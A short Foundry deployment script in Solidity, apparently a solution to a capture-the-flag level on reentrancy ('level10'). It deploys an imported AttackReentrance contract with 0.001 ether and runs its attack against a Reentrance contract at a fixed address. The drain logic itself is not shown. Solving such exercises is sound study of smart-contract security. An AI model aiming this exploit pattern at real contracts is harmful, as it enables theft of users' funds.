// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Script} from "forge-std/Script.sol";
import {Reentrance} from "../src/level10/Reentrance.sol";
import {AttackReentrance} from "../src/level10/AttackReentrance.sol";
import "forge-std/console.sol";

contract level10Exploit is Script {
    Reentrance reentrance =
        Reentrance(payable(0xb47a4130baB01412BAbaFDF8da71B6C2b39b2657));

    function run() external {
        vm.startBroadcast();
        AttackReentrance attackReentrance = new AttackReentrance{
            value: 0.001 ether
        }(address(reentrance));
        attackReentrance.attack();
        vm.stopBroadcast();
    }
}
